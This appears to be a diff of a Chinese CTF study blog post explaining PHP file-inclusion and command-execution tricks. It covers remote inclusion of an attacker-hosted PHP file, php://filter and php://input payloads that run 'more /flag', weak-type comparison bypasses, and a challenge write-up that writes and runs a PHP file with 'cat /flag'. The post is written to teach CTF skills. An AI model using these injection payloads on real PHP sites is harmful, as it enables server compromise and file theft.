+<p><strong>步骤 3：找自己的公网 IP（让题目服务器能访问到）</strong></p>
+<ul>
+<li>百度搜索「我的公网 IP」，比如得到你的公网 IP 是 <code>123.45.67.89</code>；</li>
+<li>此时你的 <code>flag.php</code> 对外访问地址是：<code>http://123.45.67.89:8080/flag.php</code>（如果改了端口，就把 8080 换成你的端口）。</li>
+</ul>
+<p><strong>步骤 4：构造 Payload 访问题目</strong></p>
+<p>把上面的地址拼接到题目 URL 的 <code>wrappers</code> 参数里，最终 URL 是：</p>
+<p>plaintext</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://题目地址/?wrappers=123.45.67.89:8080/flag.php</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>原理：题目服务器会 <code>include(&quot;http://123.45.67.89:8080/flag.php&quot;)</code>，加载你本地的 PHP 文件，执行 <code>more /flag</code> 并返回 flag！</li>
+</ul>
+<h3 id="1-2-返回-true-的方法"><a href="#1-2-返回-true-的方法" class="headerlink" title="1&#x3D;&#x3D;2 返回 true 的方法"></a><strong>1&#x3D;&#x3D;2 返回 true 的方法</strong></h3><p>利用以下两点:</p>
+<p>1.PHP 比较「数组 vs 整数」时，不会报错，而是直接返回 <code>true</code>（这是 PHP 弱类型(强类型不适用)的经典特性，CTF 常考）。</p>
+<p>2.PHP 可以直接给数字当变量赋一个数组,或者直接给数字当变量传另一个数字</p>
+<p>这里直接 get 方式让 1&#x3D;2,或者 1[]&#x3D;任意值,甚至 1&#x3D;’2’都行</p>
+<p><em>(注意:PHP 弱类型比较中，字符串</em>_’2’<strong>不会转成 ASCII 码（</strong>‘2’_<em>的 ASCII 码是 50），而是直接转成「对应的数字 2」)</em></p>
+<h3 id="php-filter-直接读取文件"><a href="#php-filter-直接读取文件" class="headerlink" title="php:&#x2F;filter 直接读取文件"></a>php:&#x2F;filter 直接读取文件</h3><p>像这样 php:&#x2F;filter&#x2F;&#x2F;resource&#x3D;&#x2F;flag 不填加工规则直接读就行</p>
+<h3 id="php-input-获取并执行-post-内容"><a href="#php-input-获取并执行-post-内容" class="headerlink" title="php:&#x2F;input 获取并执行 post 内容"></a>php:&#x2F;input 获取并执行 post 内容</h3><p><code>php://input</code> 是 PHP 的 “内置数据通道”，作用是：<strong>读取当前 HTTP 请求的「原始请求体内容」</strong>（请求体就是 POST 请求里存放数据的地方，比如表单提交的内容、我们传的 PHP 代码）。</p>
+<p><code>include(&quot;php://input&quot;)</code> 等价于：<strong>“读取这次请求的 POST 请求体内容，把它当成 PHP 文件执行”</strong>。</p>
+<p><em>注意这里 POST 请求体不能用 HackBar 写,要用 Burp 写.</em></p>
+<p><strong>Burp 里写 POST 请求体 → 给服务器传 “恶意 PHP 代码”</strong></p>
+<p>我们在 Burp 的 Repeater 里，给请求体写 <code>&lt;?php echo </code> more &#x2F;flag <code>; ?&gt;</code>，本质是：<strong>把 “读 flag 的命令” 包装成合法 PHP 代码，通过 POST 请求体传给服务器</strong>。</p>
+<ul>
+<li>服务器通过 <code>php://input</code> 读到这段代码后，<code>include</code> 会执行它；</li>
+<li><code>echo ``more /flag</code> 是执行系统命令 <code>more /flag</code>（读根目录 flag 文件），并把结果输出 —— 服务器执行后，就会把 flag 返回给我们。</li>
+</ul>
+<h3 id="为什么说用-php-filter-读取-php-代码时，都会加「编码转换」（比如-Base64）"><a href="#为什么说用-php-filter-读取-php-代码时，都会加「编码转换」（比如-Base64）" class="headerlink" title="为什么说用 php://filter 读取 php 代码时，都会加「编码转换」（比如 Base64）?"></a>为什么说用 <code>php://filter</code> 读取 php 代码时，都会加「编码转换」（比如 Base64）?</h3><p>一句话解释，是因为避免源码被执行，直接拿到明文源码.</p>
+<p>举个例子：</p>
+<p>假设 <code>flag.php</code> 的内容是：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">**<span class="meta">&lt;?php</span>** </span><br><span class="line"><span class="variable">$flag</span> = <span class="string">&quot;flag&#123;ctf_php_filter&#125;&quot;</span>; </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;欢迎访问&quot;</span>;<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>如果你用 <code>include(&quot;php://filter/resource=flag.php&quot;)</code>：服务器会读取 <code>flag.php</code> 的<strong>原始源码</strong>，并当作 PHP 代码执行 —— 但源码里的 <code>&lt;?php ... ?&gt;</code> 会被再次解析，<code>$flag</code> 变量会被定义，但依然不会输出（除非源码里有 <code>echo $flag</code>）.</p>
+<p>但如果进行编码转换（比如 Base64），避免源码被执行，可直接拿到明文源码</p>
+<h3 id="file-get-content-函数"><a href="#file-get-content-函数" class="headerlink" title="file_get_content()函数"></a>file_get_content()函数</h3><p>括号里面写文件路径 直接读取这个文件的内容(而不是执行源码等) 不输出 返回值是这个内容</p>
+<p>如果读取失败会输出 false</p>
+<h3 id="http-访问并执行-php-文件"><a href="#http-访问并执行-php-文件" class="headerlink" title="http 访问并执行 php 文件"></a><strong>http 访问并执行 php 文件</strong></h3><p>在网址后 +&#x2F;路径&#x2F;文件名.php，即可访问并执行这个 php 文件</p>
+<h3 id="Level11-WP"><a href="#Level11-WP" class="headerlink" title="Level11 WP"></a>Level11 WP</h3><p>本题较为精彩，可运用到上述很多知识点，故展开说明一下</p>
+<p><img src="/images/PpplbjAVToo1M9xDgWpcPL4znUc.png"></p>
+<p>注意到本题是想让你用 file_put_contents 来创建一个名为 filename 的文件并写入 data 数据</p>
+<p>这里要结合前一点所说 http 访问并执行 php 文件,我们先创建带有获取根目录下 flag 的值代码的</p>
+<p>php 文件,再用 http 访问并执行.</p>
+<p>我们先 get 一个文件名 m.php，这时候还没有写入代码</p>
+<p><img src="/images/BjtwbI1zBo5naXxzTOTcEqGtnyc.png"></p>
+<p><img src="/images/XKoMboBwJoEawvxxpjjc9fPcnYf.png"></p>
+<p>再 post 要写入的代码 用反引号绕过括号，用单引号绕过 flag.</p>
+<p>这时候应该很好的绕过了字符过滤，创建了一个名为 m 的 php 文件</p>
+<p><img src="/images/WtaebpB8soBJ5ExqmTWcskYQnUc.png"></p>
+<p>再用 http 访问并执行 这时候能执行 cat &#x2F;flag 从而拿到 flag.</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="http://hnu-legend1440.com/2025/10/29/%E7%AC%AC%E4%BA%8C%E7%AB%A0-RCE%E4%B8%8E%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -981,7 +1532,7 @@ cat 路径 阅读文件
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">13</span>
+          <span class="site-state-item-count">14</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
